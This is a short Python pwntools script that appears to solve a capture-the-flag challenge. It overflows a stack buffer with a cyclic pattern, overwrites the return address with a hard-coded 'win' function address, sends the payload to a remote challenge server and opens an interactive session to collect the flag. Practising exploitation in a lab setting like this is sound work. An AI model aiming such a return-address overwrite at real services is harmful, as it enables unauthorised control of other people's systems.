from pwn import *

#Overflow buffer just enough so that we can overwrite the return address
payload = cyclic(cyclic_find('paaa')) 

#Below is the address found using the nm ./server | grep win command
payload += p32(0x8048586)
print('Payload size is : ', len(payload))

#establish connect to host and port, store connecting in r
r = remote('thekidofarcrania.com', 4902)
r.send(payload)
print(payload)
#interactive connection is sufficient to let us see the flag
r.interactive()
